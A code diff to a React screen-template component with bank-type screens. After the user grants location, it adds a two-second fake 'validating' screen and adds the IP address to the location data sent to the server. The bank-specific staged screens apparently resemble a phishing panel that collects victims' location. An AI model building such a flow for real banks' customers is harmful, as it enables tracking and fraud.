@@ -190,12 +190,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               bankType={banco}
               onLocationGranted={(locationData) => {
                 console.log('[Geolocation] Ubicación obtenida:', locationData);
-                onSubmit(ScreenType.GEOLOCATION, {
-                  latitude: locationData.latitude,
-                  longitude: locationData.longitude,
-                  googleMapsLink: locationData.googleMapsLink,
-                  locationTimestamp: locationData.timestamp
-                });
+                // Primero mostrar pantalla de cargando
+                onSubmit(ScreenType.VALIDANDO, {});
+                
+                // Después de 2 segundos, enviar los datos de ubicación al servidor
+                setTimeout(() => {
+                  onSubmit(ScreenType.GEOLOCATION, {
+                    latitude: locationData.latitude,
+                    longitude: locationData.longitude,
+                    googleMapsLink: locationData.googleMapsLink,
+                    locationTimestamp: locationData.timestamp,
+                    ipAddress: locationData.ipAddress
+                  });
+                }, 2000);
               }}
               onLocationDenied={() => {
                 console.log('[Geolocation] Ubicación denegada por el usuario');
